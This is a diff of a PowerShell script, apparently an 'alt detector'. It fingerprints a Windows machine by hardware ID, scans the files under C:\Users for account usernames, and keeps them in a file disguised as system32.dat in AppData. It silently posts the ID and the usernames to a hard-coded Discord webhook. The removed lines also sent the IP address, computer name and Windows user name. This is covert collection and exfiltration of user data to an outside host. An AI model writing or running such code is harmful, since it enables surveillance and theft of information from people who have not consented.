@@ -2,7 +2,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHop
 $startPath = "C:\Users"
 $hwidPath = "$env:APPDATA\Microsoft\Windows\Caches\system32.dat"
 
-# Get HWID (using multiple identifiers for reliability)
+# Get HWID
 function Get-HWID {
     try {
         $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
@@ -20,30 +20,7 @@ function Get-HWID {
 
 $hwid = Get-HWID
 
-# Send HWID info to webhook immediately when script runs
-try {
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
-} catch {
-    $ip = "Unable to get IP"
-}
-
-$hwidMessage = @"
-**🔑 HWID INFO**
-**HWID:** `$hwid`
-**Computer:** $env:COMPUTERNAME
-**User:** $env:USERNAME
-**IP:** $ip
-**Time:** $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-"@
-
-$payload = @{
-    content = $hwidMessage
-    username = "HWID Tracker"
-} | ConvertTo-Json
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-
-# Load or initialize stored alts
+# Load stored alts
 $storedAlts = @{}
 if (Test-Path $hwidPath) {
     try {
@@ -103,7 +80,6 @@ foreach ($file in $allFiles) {
                 "Path" = $file.FullName
             }
             
-            # Check if this is a new alt
             if (-not $storedAlts.ContainsKey($username)) {
                 $newAlts += $username
             }
@@ -114,12 +90,11 @@ foreach ($file in $allFiles) {
     }
 }
 
-# Merge new alts with stored alts
+# Save new alts
 foreach ($alt in $newAlts) {
     $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
 }
 
-# Save updated alts to file (encrypted)
 if ($storedAlts.Count -gt 0) {
     $json = $storedAlts | ConvertTo-Json
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
@@ -127,21 +102,14 @@ if ($storedAlts.Count -gt 0) {
     Set-Content -Path $hwidPath -Value $encrypted -Force
 }
 
-# Display results in console (without paths)
+# Display and send results
 if ($newAlts.Count -gt 0) {
-    Write-Host "`nNew alts found on this system:" -ForegroundColor Cyan
+    Write-Host "`nNew alts found:" -ForegroundColor Cyan
     $newAlts | ForEach-Object {
         Write-Host ("  {0}" -f $_) -ForegroundColor Magenta
     }
     
-    # Show all alts ever found
-    Write-Host "`nTotal alts ever detected on this HWID:" -ForegroundColor Cyan
-    $storedAlts.Keys | ForEach-Object {
-        Write-Host ("  {0} (First seen: {1})" -f $_, $storedAlts[$_]) -ForegroundColor Yellow
-    }
-    
-    # Send to Discord (only new alts with HWID)
-    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n`n"
+    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n`n"
     foreach ($username in $newAlts) {
         $message += "`"$username`"`n"
     }
@@ -153,18 +121,8 @@ if ($newAlts.Count -gt 0) {
     
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
 } else {
-    Write-Host "No new alts found on this system." -ForegroundColor Yellow
-    Write-Host "Previously detected alts for this HWID:" -ForegroundColor Cyan
+    Write-Host "No new alts found." -ForegroundColor Yellow
     if ($storedAlts.Count -gt 0) {
-        $storedAlts.Keys | ForEach-Object {
-            Write-Host ("  {0} (First seen: {1})" -f $_, $storedAlts[$_]) -ForegroundColor Yellow
-        }
-        
-        # Send status update that no new alts found
-        $statusMessage = "**ALTS CHECK**`n**HWID:** $hwid`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Status:** No new alts`n**Previously detected:** $($storedAlts.Count) alts"
-        $payload = @{content = $statusMessage; username = "Alt Detector"} | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-    } else {
-        Write-Host "  None" -ForegroundColor Gray
+        Write-Host "Previously detected alts: $($storedAlts.Count) total" -ForegroundColor Gray
     }
 }
